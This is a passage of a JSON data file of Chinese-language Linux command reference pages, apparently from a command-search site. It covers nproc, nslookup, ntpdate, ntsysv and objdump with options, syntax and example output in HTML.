class=\"hljs-regexp\">/etc/</span>nologin\n</code></pre>\n<p>除root以外的用户不能登录了。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "nproc",
        "des": "打印可用的处理器单元数量。",
        "body": "<h1 id=\"nproc\">nproc</h1>\n<p>打印可用的处理器单元数量。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">nproc [<span class=\"hljs-symbol\">OPTION</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>打印可用的处理器单元数量。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--all         打印已安装处理器的数量。</span>\n<span class=\"hljs-comment\">--ignore=N    如果可以的情况下，排除 N 个处理单元。</span>\n<span class=\"hljs-comment\">--help        显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version     显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># nproc</span>\n<span class=\"hljs-number\">8</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 nproc</code>，<code>info coreutils 'nproc invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "nslookup",
        "des": "查询域名DNS信息的工具",
        "body": "<h1 id=\"nslookup\">nslookup</h1>\n<p>查询域名DNS信息的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>nslookup命令</strong> 是常用域名查询工具，就是查DNS信息用的命令。</p>\n<p>nslookup4有两种工作模式，即“交互模式”和“非交互模式”。在“交互模式”下，用户可以向域名服务器查询各类主机、域名的信息，或者输出域名中的主机列表。而在“非交互模式”下，用户可以针对一个主机或域名仅仅获取特定的名称或所需信息。</p>\n<p>进入交互模式，直接输入nslookup命令，不加任何参数，则直接进入交互模式，此时nslookup会连接到默认的域名服务器（即<code>/etc/resolv.conf</code>的第一个dns地址）。或者输入<code>nslookup -nameserver/ip</code>。进入非交互模式，就直接输入<code>nslookup 域名</code>就可以了。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">nslookup</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-sil：不显示任何警告信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>域名：指定要查询域名。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># nslookup www.jsdig.com</span>\n<span class=\"hljs-symbol\">Server:</span>         <span class=\"hljs-number\">202</span>.<span class=\"hljs-number\">96</span>.<span class=\"hljs-number\">104</span>.<span class=\"hljs-number\">15</span>\n<span class=\"hljs-keyword\">Address: </span>       <span class=\"hljs-number\">202</span>.<span class=\"hljs-number\">96</span>.<span class=\"hljs-number\">104</span>.<span class=\"hljs-number\">15</span><span class=\"hljs-comment\">#53</span>\n\nNon-authoritative answer:\nwww.<span class=\"hljs-keyword\">jsdig.com </span>canonical name = host.<span class=\"hljs-number\">1</span>.<span class=\"hljs-keyword\">jsdig.com.\n</span><span class=\"hljs-symbol\">Name:</span>   host.<span class=\"hljs-number\">1</span>.<span class=\"hljs-keyword\">jsdig.com\n</span><span class=\"hljs-keyword\">Address: </span><span class=\"hljs-number\">100</span>.<span class=\"hljs-number\">42</span>.<span class=\"hljs-number\">212</span>.<span class=\"hljs-number\">8</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ntpdate",
        "des": "使用网络计时协议（NTP）设置日期和时间",
        "body": "<h1 id=\"ntpdate\">ntpdate</h1>\n<p>使用网络计时协议（NTP）设置日期和时间</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ntpdate命令</strong> 是用来设置本地日期和时间。它从指定的每个服务器获得了一些样本，并应用标准 NTP 时钟过滤器和选择算法来选择最好的样本。</p>\n<p>此 ntpdate 命令使用以下方法进行时间调整：</p>\n<ul>\n<li>  如果它确定时钟偏差超过 0.5 秒，它通过调用 settimeofday 子例程设置时钟时间。在引导时间，这是一个首选的方法。</li>\n<li>  如 果它确定时钟偏差小于 0.5 秒，它通过调用 adjtime 子例程和偏移量来调整时钟时间。此方法倾向于用牺牲一些稳定性来保持漂移时钟更加准确。 当不是通过运行一个守护程序而是从 cron 命令有规则的运行ntpdate 命令时，每一小时或两小时执行一次可以保证足够的走时精度，从而避免调整时钟。</li>\n</ul>\n<p>使用很多服务器可以大幅度改善 ntpdate 命令的可靠性与精度。尽管能使用单一服务器，但您能通过提供至少三个或四个服务器以获得更好的性能。</p>\n<p>如果一个类似 xntpd 守护程序的 NTP 服务器守护程序正在同一主机上运行，命令将拒绝ntpdate 设置日期。</p>\n<p>你必须有 root 权限才能在主机上运行这个命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ntpdate [ -b] [ -d] [ -s] [ -u] [ -aKeyid] [ -eAuthenticationDelay] [ -kKeyFile] [ -oVersion] [ -pSamples] [ -tTimeOut] <span class=\"hljs-symbol\">Server</span>...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<table>\n<tbody>\n<tr>\n<td>-aKeyid</td>\n<td>使用 Keyid 来认证全部数据包。</td>\n</tr>\n<tr>\n<td>-b</td>\n<td>通过调用 settimeofday 子例程来增加时钟的时间。</td>\n</tr>\n<tr>\n<td>-d</td>\n<td>指定调试方式。判断 ntpdate 命令会产生什么结果（不产生实际的结果）。结果再现在屏幕上。这个标志使用无特权的端口。</td>\n</tr>\n<tr>\n<td>-eAuthenticationDelay</td>\n<td>指定延迟认证处理的时间秒数。</td>\n</tr>\n<tr>\n<td>-kKeyFile</td>\n<td>当不使用缺省值 /etc/ntp.keys 文件时，为包含密钥的文件指定一个不同的名称。 请参阅文件KeyFile的描述。</td>\n</tr>\n<tr>\n<td>-oVersion</td>\n<td>当轮询它的发出数据包时，指定使用的 NTP 版本实现。 Version 的值可以是 1，2，3。缺省值是 3。</td>\n</tr>\n<tr>\n<td>-pSamples</td>\n<td>指定从每个服务器获取的样本的数目。 Samples 的值在 1 和 8 之间，并包括 1 和 8。它的缺省值是 4。</td>\n</tr>\n<tr>\n<td>-s</td>\n<td>指定日志操作 syslog 设施的使用，而不是使用标准输出。 当运行 ntpdate 命令和 cron命令时，它是很有用的。</td>\n</tr>\n<tr>\n<td>-tTimeOut</td>\n<td>指定等待响应的时间。给定 TimeOut 的值四舍五入为 0.2 秒的倍数。缺省值是 1 秒。</td>\n</tr>\n<tr>\n<td>-u</td>\n<td>指定使用无特权的端口发送数据包。 当在一个对特权端口的输入流量进行阻拦的防火墙后是很有益的， 并希望在防火墙之外和主机同步。防火墙是一个系统或者计算机，它控制从外网对专用网的访问。</td>\n</tr>\n</tbody>\n</table>\n\n\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ntsysv",
        "des": "集中管理系统的各种服务",
        "body": "<h1 id=\"ntsysv\">ntsysv</h1>\n<p>集中管理系统的各种服务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ntsysv命令</strong> 提供了一个基于文本界面的菜单操作方式，集中管理系统不同的运行等级下的系统服务启动状态。在RedHat各个发行版，CentOS各个版本，都自带这个工具。它具有互动式操作界面，您可以轻易地利用方向键和空格键等，开启，关闭操作系统在每个执行等级中，所要执行的系统服务。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ntsysv</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--leve：指定运行等级；</span>\n<span class=\"hljs-comment\">--back：在互动式界面里，显示Back钮，而非cancel钮。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>输入ntsysv命令后，出现一个交互式的管理菜单，如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-addition\">!ntsysv</span>\n</code></pre>\n<p>使用空格键选择或者取消选项！</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "objdump",
        "des": "显示二进制文件信息",
        "body": "<h1 id=\"objdump\">objdump</h1>\n<p>显示二进制文件信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>objdump命令</strong> 是用查看目标文件或者可执行的目标文件的构成的gcc工具。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>a --archive-headers \n<span class=\"hljs-comment\"># 显示档案库的成员信息,类似ls -l将lib*.a的信息列出。 </span>\n\n<span class=\"hljs-literal\">-</span>b bfdname --target=bfdname \n<span class=\"hljs-comment\"># 指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： </span>\n\nobjdump -b oasys -m vax -h fu.o \n<span class=\"hljs-comment\"># 显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 </span>\n\n<span class=\"hljs-literal\">-</span>C --demangle \n<span class=\"hljs-comment\"># 将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 </span>\n<span class=\"hljs-literal\">-</span>-debugging \n<span class=\"hljs-literal\">-</span>g \n<span class=\"hljs-comment\"># 显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持。 </span>\n\n<span class=\"hljs-literal\">-</span>e --debugging-tags \n<span class=\"hljs-comment\"># 类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 </span>\n<span class=\"hljs-literal\">-</span>-disassemble \n<span class=\"hljs-literal\">-</span>d \n<span class=\"hljs-comment\"># 从objfile中反汇编那些特定指令机器码的section。 </span>\n\n<span class=\"hljs-literal\">-</span>D --disassemble-all \n<span class=\"hljs-comment\"># 与 -d 类似，但反汇编所有section. </span>\n\n<span class=\"hljs-literal\">-</span>-prefix-addresses \n<span class=\"hljs-comment\"># 反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 </span>\n\n<span class=\"hljs-literal\">-</span>EB \n<span class=\"hljs-literal\">-</span>EL \n<span class=\"hljs-literal\">-</span>-endian={big|little} \n<span class=\"hljs-comment\"># 指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. </span>\n\n<span class=\"hljs-literal\">-</span>f \n<span class=\"hljs-literal\">-</span>-file-headers \n显示objfile中每个文件的整体头部摘要信息。 \n\n<span class=\"hljs-literal\">-</span>h \n<span class=\"hljs-literal\">-</span>-section-headers \n<span class=\"hljs-literal\">-</span>-headers \n显示目标文件各个section的头部摘要信息。 \n\n<span class=\"hljs-literal\">-</span>H \n<span class=\"hljs-literal\">-</span>-help \n简短的帮助信息。 \n\n<span class=\"hljs-literal\">-</span>i \n<span class=\"hljs-literal\">-</span>-info \n显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 \n\n<span class=\"hljs-literal\">-</span>j name\n<span class=\"hljs-literal\">-</span>-section=name \n仅仅显示指定名称为name的section的信息 \n\n<span class=\"hljs-literal\">-</span>l\n<span class=\"hljs-literal\">-</span>-line-numbers \n用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 \n\n<span class=\"hljs-literal\">-</span>m machine \n<span class=\"hljs-literal\">-</span>-architecture=machine \n指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. \n\n<span class=\"hljs-literal\">-</span>-reloc \n<span class=\"hljs-literal\">-</span>r \n显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 \n\n<span class=\"hljs-literal\">-</span>-dynamic-reloc \n<span class=\"hljs-literal\">-</span>R \n显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 \n\n<span class=\"hljs-literal\">-</span>s \n<span class=\"hljs-literal\">-</span>-full-contents \n显示指定section的完整内容。默认所有的非空section都会被显示。 \n\n<span class=\"hljs-literal\">-</span>S \n<span class=\"hljs-literal\">-</span>-source \n尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 \n\n<span class=\"hljs-literal\">-</span>-show-raw-insn \n反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 \n\n<span class=\"hljs-literal\">-</span>-no-show-raw-insn \n反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 \n\n<span class=\"hljs-literal\">-</span>-start-address=address \n从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 \n\n<span class=\"hljs-literal\">-</span>-stop-address=address \n显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 \n\n<span class=\"hljs-literal\">-</span>t \n<span class=\"hljs-literal\">-</span>-syms \n显示文件的符号表入口。类似于nm -s提供的信息 \n\n<span class=\"hljs-literal\">-</span>T \n<span class=\"hljs-literal\">-</span>-dynamic-syms \n显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 \n\n<span class=\"hljs-literal\">-</span>V \n<span class=\"hljs-literal\">-</span>-version \n版本信息 \n\n<span class=\"hljs-literal\">-</span>-all-headers \n<span class=\"hljs-literal\">-</span>x \n显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 \n\n<span class=\"hljs-literal\">-</span>z \n<span class=\"hljs-literal\">-</span>-disassemble-zeroes \n一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 \n\n@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>首先，在给出后面大部分测试所基于的源代码以及编译指令。 源代码如下：&nbsp;</p>\n<pre><code class=\"language-shell\">root<span class=\"hljs-symbol\">@localhost</span> [test]<span class=\"hljs-meta\"># nl mytest.cpp </span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">printTest</span><span class=\"hljs-params\">()</span> </span>{\n    <span class=\"hljs-type\">char</span> a;\n    a = <span class=\"hljs-string\">'a'</span>;\n}\n\n<span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">printTest2</span><span class=\"hljs-params\">()</span> </span>{\n<span class=\"hljs-type\">int</span> a = <span class=\"hljs-number\">2</span>;\na+=<span class=\"hljs-number\">2</span>;\n} \n</code></pre>\n<p>对以上源代码进行编译，如下：&nbsp;</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> test]<span class=\"hljs-meta\"># g++ -c -g mytest.cpp </span>\n</code></pre>\n<p>这里，生成的文件是mytest.o，为了方便测试包含了调试的信息，对可执行文件的测试，显示的结果类似。&nbsp;</p>\n<p> **查看当前使用的objdump的版本号：&nbsp;** </p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-title\">@localhost</span> test]# objdump -V \nGNU objdump <span class=\"hljs-number\">2.17</span>.<span class=\"hljs-number\">50.0</span>.<span class=\"hljs-number\">6</span><span class=\"hljs-number\">-14</span>.el<span class=\"hljs-number\">5</span> <span class=\"hljs-number\">20061020</span> \nCopyright <span class=\"hljs-number\">2005</span> <span class=\"hljs-keyword\">free</span> Software Foundation<span class=\"hljs-punctuation\">,</span> Inc. \nThis program is <span class=\"hljs-keyword\">free</span> software<span class=\"hljs-comment\">; you may redistribute it under the terms of </span>\nthe GNU General Public License.  This program has absolutely no warranty. \n</code></pre>\n<p> **查看档案库文件中的信息：&nbsp;** </p>\n<pre><code class=\"language-shell\">[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">test</span>]<span class=\"hljs-comment\"># objdump -a libmy2.a </span>\n<span class=\"hljs-attr\">In archive libmy2.a:</span> \n<span class=\"hljs-attr\">myfile.o:</span>     <span class=\"hljs-string\">file</span> <span class=\"hljs-string\">format</span> <span class=\"hljs-string\">elf32-i386</span> \n<span class=\"hljs-string\">rwxrwxrwx</span> <span class=\"hljs-number\">0</span><span class=\"hljs-string\">/0</span>   <span class=\"hljs-number\">2724 </span><span class=\"hljs-string\">Nov</span> <span class=\"hljs-number\">16</span> <span class=\"hljs-number\">16</span><span class=\"hljs-string\">:06</span> <span class=\"hljs-number\">2009 </span><span class=\"hljs-string\">myfile.o</span> \n<span class=\"hljs-attr\">mytest.o:</span>     <span class=\"hljs-string\">file</span> <span class=\"hljs-string\">format</span> <span class=\"hljs-string\">elf32-i386</span> \n<span class=\"hljs-string\">rw-r--r--</span> <span class=\"hljs-number\">0</span><span class=\"hljs-string\">/0</span>    <span class=\"hljs-number\">727</span> <span class=\"hljs-string\">Jul</span> <span class=\"hljs-number\">13</span> <span class=\"hljs-number\">15</span><span class=\"hljs-string\">:32</span> <span class=\"hljs-number\">2011 </span><span class=\"hljs-string\">mytest.o</span> \n</code></pre>\n<p> *<em>这里，libmy2.a是一个使用ar命令将多个</em>.o目标文件打包而生成的静态库。命令的输出类似<code>ar -tv</code>，相比较<code>ar -tv</code>输出如下：&nbsp;** </p>\n<pre><code class=\"language-shell\">[root@localhost test]<span class=\"hljs-comment\"># ar -tv libmy2.a </span>\nrwxrwxrwx 0/0  <span class=\"hljs-number\"> 2724 </span>Nov<span class=\"hljs-number\"> 16 </span>16:06<span class=\"hljs-number\"> 2009 </span>myfile.o \nrw-r--r-- 0/0   <span class=\"hljs-number\"> 727 </span>Jul<span class=\"hljs-number\"> 13 </span>15:32<span class=\"hljs-number\"> 2011 </span>mytest.o \n</code></pre>\n<p>显示可用的架构和目标结构列表：&nbsp;</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-title\">@localhost</span> test]# objdump -i \nBFD header file version <span class=\"hljs-number\">2.17</span>.<span class=\"hljs-number\">50.0</span>.<span class=\"hljs-number\">6</span><span class=\"hljs-number\">-14</span>.el<span class=\"hljs-number\">5</span> <span class=\"hljs-number\">20061020</span> \nelf<span class=\"hljs-number\">32</span>-<span class=\"hljs-type\">i386</span> \n(header little endian<span class=\"hljs-punctuation\">,</span> data little endian) \n  <span class=\"hljs-type\">i386</span> \na.out-<span class=\"hljs-type\">i386</span>-linux \n(header little endian<span class=\"hljs-punctuation\">,</span> data little endian) \n  <span class=\"hljs-type\">i386</span> \nefi-app-ia<span class=\"hljs-number\">32</span> \n(header little endian<span class=\"hljs-punctuation\">,</span> data little endian) \n  <span class=\"hljs-type\">i386</span> \nelf<span class=\"hljs-number\">64</span>-<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">86</span><span class=\"hljs-number\">-64</span> \n(header little endian<span class=\"hljs-punctuation\">,</span> data little endian) \n  <span class=\"hljs-type\">i386</span> \nelf<span class=\"hljs-number\">64</span>-little \n(header little endian<span class=\"hljs-punctuation\">,</span> data little endian) \n  <span class=\"hljs-type\">i386</span> \nelf<span class=\"hljs-number\">64</span>-big \n(header big endian<span class=\"hljs-punctuation\">,</span> data big endian) \n  <span class=\"hljs-type\">i386</span> \nelf<span class=\"hljs-number\">32</span>-little \n(header little endian<span class=\"hljs-punctuation\">,</span> data little endian) \n  <span class=\"hljs-type\">i386</span> \nelf<span class=\"hljs-number\">32</span>-big \n(header big endian<span class=\"hljs-punctuation\">,</span> data big endian) \n  <span class=\"hljs-type\">i386</span> \nsrec \n(header endianness unknown<span class=\"hljs-punctuation\">,</span> data endianness unknown) \n  <span class=\"hljs-type\">i386</span> \nsymbolsrec \n(header endianness unknown<span class=\"hljs-punctuation\">,</span> data endianness unknown) \n  <span class=\"hljs-type\">i386</span> \ntekhex \n(header endianness unknown<span class=\"hljs-punctuation\">,</span> data endianness unknown) \n  <span class=\"hljs-type\">i386</span> \nbinary \n(header endianness unknown<span class=\"hljs-punctuation\">,</span> data endianness unknown) \n  <span class=\"hljs-type\">i386</span> \nihex \n(header endianness unknown<span class=\"hljs-punctuation\">,</span> data endianness unknown) \n  <span class=\"hljs-type\">i386</span> \ntrad-core \n(header endianness unknown<span class=\"hljs-punctuation\">,</span> data endianness unknown) \n\n              elf<span class=\"hljs-number\">32</span>-<span class=\"hljs-type\">i386</span> a.out-<span class=\"hljs-type\">i386</span>-linux efi-app-ia<span class=\"hljs-number\">32</span> elf<span class=\"hljs-number\">64</span>-<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">86</span><span class=\"hljs-number\">-64</span> \n          <span class=\"hljs-type\">i386</span> elf<span class=\"hljs-number\">32</span>-<span class=\"hljs-type\">i386</span> a.out-<span class=\"hljs-type\">i386</span>-linux efi-app-ia<span class=\"hljs-number\">32</span> elf<span class=\"hljs-number\">64</span>-<span class=\"hljs-keyword\">x</span><span class=\"hljs-number\">86</span><span class=\"hljs-number\">-64</span> \n\n              elf<span class=\"hljs-number\">64</span>-little elf<span class=\"hljs-number\">64</span>-big elf<span class=\"hljs-number\">32</span>-little elf<span class=\"hljs-number\">32</span>-big srec symbolsrec \n          <span class=\"hljs-type\">i386</span> elf<span class=\"hljs-number\">64</span>-little elf<span class=\"hljs-number\">64</span>-big elf<span class=\"hljs-number\">32</span>-little elf<span class=\"hljs-number\">32</span>-big srec symbolsrec \n\n              tekhex binary ihex trad-core \n          <span class=\"hljs-type\">i386</span> tekhex binary ihex --------- \n</code></pre>\n<p>这里，显示的信息是相对于 -b 或者 -m 选项可用的架构和目标格式列表。&nbsp;</p>\n<p> **显示mytest.o文件中的text段的内容：&nbsp;** </p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-title\">@localhost</span> test]# objdump --<span class=\"hljs-keyword\">section</span><span class=\"hljs-operator\">=</span>.text -s mytest.o \nmytest.o:     file format elf<span class=\"hljs-number\">32</span>-<span class=\"hljs-type\">i386</span> \nContents of <span class=\"hljs-keyword\">section</span> .text: \n<span class=\"hljs-number\">0000</span> <span class=\"hljs-number\">5589e583</span> ec<span class=\"hljs-number\">10</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">645</span> ff<span class=\"hljs-number\">61</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">9</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">3</span> <span class=\"hljs-number\">5589e583</span>  U......E.a..U... \n<span class=\"hljs-number\">0010</span> ec<span class=\"hljs-number\">10</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">745</span> fc<span class=\"hljs-number\">020000</span> <span class=\"hljs-number\">008345</span>fc <span class=\"hljs-number\">02</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">9</span><span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">3</span>    ...E......E.... \n</code></pre>\n<p>这里注意，不能单独使用-j或者--section，例如<code>objdump --section=.text mytest.o</code>是不会运行成功的。&nbsp;</p>\n<p> **反汇编mytest.o中的text段内容，并尽可能用源代码形式表示：&nbsp;** </p>\n<pre><code class=\"language-shell\">[root@localhost test]<span class=\"hljs-comment\"># objdump -j .text -S mytest.o </span>\nmytest.o:     file <span class=\"hljs-keyword\">format</span> elf32-i386 \nDisassembly of section .text: \n<span class=\"hljs-number\">00000000</span> &lt;_Z9printTestv&gt;: \nvoid printTest() \n   <span class=\"hljs-number\">0</span>:   <span class=\"hljs-number\">55</span>                      <span class=\"hljs-keyword\">push</span>   %ebp \n   <span class=\"hljs-number\">1</span>:   <span class=\"hljs-number\">89</span> e5                   mov    %esp,%ebp \n   <span class=\"hljs-number\">3</span>:   <span class=\"hljs-number\">83</span> ec <span class=\"hljs-number\">10</span>                <span class=\"hljs-function\"><span class=\"hljs-keyword\">sub</span>    $0<span class=\"hljs-title\">x10</span>,%<span class=\"hljs-title\">esp</span> \n</span>{ \n        char a; \n        a = <span class=\"hljs-string\">'a'</span>; \n   <span class=\"hljs-number\">6</span>:   c6 <span class=\"hljs-number\">45</span> ff <span class=\"hljs-number\">61</span>             movb   $0x61,<span class=\"hljs-number\">0xffffffff</span>(%ebp) \n} \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n<span class=\"hljs-number\">000000</span>c &lt;_Z10printTest2v&gt;: \nvoid printTest2() \n   c:   <span class=\"hljs-number\">55</span>                      <span class=\"hljs-keyword\">push</span>   %ebp \n   d:   <span class=\"hljs-number\">89</span> e5                   mov    %esp,%ebp \n   f:   <span class=\"hljs-number\">83</span> ec <span class=\"hljs-number\">10</span>                <span class=\"hljs-function\"><span class=\"hljs-keyword\">sub</span>    $0<span class=\"hljs-title\">x10</span>,%<span class=\"hljs-title\">esp</span> \n</span>{ \n        <span class=\"hljs-keyword\">int</span> a = <span class=\"hljs-number\">2</span>; \n  <span class=\"hljs-number\">12</span>:   c7 <span class=\"hljs-number\">45</span> fc <span class=\"hljs-number\">02</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span>    movl   $0x2,<span class=\"hljs-number\">0xfffffffc</span>(%ebp) \n        a+=<span class=\"hljs-number\">2</span>; \n  <span class=\"hljs-number\">19</span>:   <span class=\"hljs-number\">83</span> <span class=\"hljs-number\">45</span> fc <span class=\"hljs-number\">02</span>             addl   $0x2,<span class=\"hljs-number\">0xfffffffc</span>(%ebp) \n} \n  <span class=\"hljs-number\">1</span>d:   c9                      leave  \n  <span class=\"hljs-number\">1</span>e:   c3                      ret    \n</code></pre>\n<p>这里注意，不能单独使用-j或者--section，例如<code>objdump -j .text mytest.o是不会运行成功的</code>。另外-S命令对于包含调试信息的目标文件，显示的效果比较好，如果编译时没有指定g++的-g选项，那么目标文件就不包含调试信息，那么显示效果就差多了。&nbsp;</p>\n<p> **反汇编出mytest.o的源代码:&nbsp;** </p>\n<pre><code class=\"language-shell\">[root@localhost test]<span class=\"hljs-comment\"># objdump -S mytest.o </span>\nmytest.o:     file <span class=\"hljs-keyword\">format</span> elf32-i386 \n\nDisassembly of section .text: \n\n<span class=\"hljs-number\">00000000</span> &lt;_Z9printTestv&gt;: \nvoid printTest() \n   <span class=\"hljs-number\">0</span>:   <span class=\"hljs-number\">55</span>                      <span class=\"hljs-keyword\">push</span>   %ebp \n   <span class=\"hljs-number\">1</span>:   <span class=\"hljs-number\">89</span> e5                   mov    %esp,%ebp \n   <span class=\"hljs-number\">3</span>:   <span class=\"hljs-number\">83</span> ec <span class=\"hljs-number\">10</span>                <span class=\"hljs-function\"><span class=\"hljs-keyword\">sub</span>    $0<span class=\"hljs-title\">x10</span>,%<span class=\"hljs-title\">esp</span> \n</span>{ \n        char a; \n        a = <span class=\"hljs-string\">'a'</span>; \n   <span class=\"hljs-number\">6</span>:   c6 <span class=\"hljs-number\">45</span> ff <span class=\"hljs-number\">61</span>             movb   $0x61,<span class=\"hljs-number\">0xffffffff</span>(%ebp) \n} \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n<span class=\"hljs-number\">0000000</span>c &lt;_Z10printTest2v&gt;: \nvoid printTest2() \n   c:   <span class=\"hljs-number\">55</span>                      <span class=\"hljs-keyword\">push</span>   %ebp \n   d:   <span class=\"hljs-number\">89</span> e5                   mov    %esp,%ebp \n   f:   <span class=\"hljs-number\">83</span> ec <span class=\"hljs-number\">10</span>                <span class=\"hljs-function\"><span class=\"hljs-keyword\">sub</span>    $0<span class=\"hljs-title\">x10</span>,%<span class=\"hljs-title\">esp</span> \n</span>{ \n       <span class=\"hljs-keyword\">int</span> a = <span class=\"hljs-number\">2</span>; \n  <span class=\"hljs-number\">12</span>:   c7 <span class=\"hljs-number\">45</span> fc <span class=\"hljs-number\">02</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span>    movl   $0x2,<span class=\"hljs-number\">0xfffffffc</span>(%ebp) \n        a+=<span class=\"hljs-number\">2</span>; \n  <span class=\"hljs-number\">19</span>:   <span class=\"hljs-number\">83</span> <span class=\"hljs-number\">45</span> fc <span class=\"hljs-number\">02</span>             addl   $0x2,<span class=\"hljs-number\">0xfffffffc</span>(%ebp) \n} \n  <span class=\"hljs-number\">1</span>d:   c9                      leave  \n  <span class=\"hljs-number\">1</span>e:   c3                      ret    \n</code></pre>\n<p>这里，尤其当编译的时候指定了-g这种调试参数时，反汇编的效果比较明显。隐含了-d参数。&nbsp;</p>\n<p> **显示文件的符号表入口:&nbsp;** </p>\n<pre><code class=\"language-shell\">[root@localhost test]# objdump -t mytest.o \nmytest.o:     file format elf32-i386 \n\nSYMBOL TABLE: \n<span class=\"hljs-number\">00000000</span> l    df *ABS*  <span class=\"hljs-number\">00000000</span> mytest.cpp \n<span class=\"hljs-number\">00000000</span> l    d  .text  <span class=\"hljs-number\">00000000</span> .text \n<span class=\"hljs-number\">00000000</span> l    d  .data  <span class=\"hljs-number\">00000000</span> .data \n<span class=\"hljs-number\">00000000</span> l    d  .bss   <span class=\"hljs-number\">00000000</span> .bss \n<span class=\"hljs-number\">00000000</span> l    d  .debug_abbrev  <span class=\"hljs-number\">00000000</span> .debug_abbrev \n<span class=\"hljs-number\">00000000</span> l    d  .debug_info    <span class=\"hljs-number\">00000000</span> .debug_info 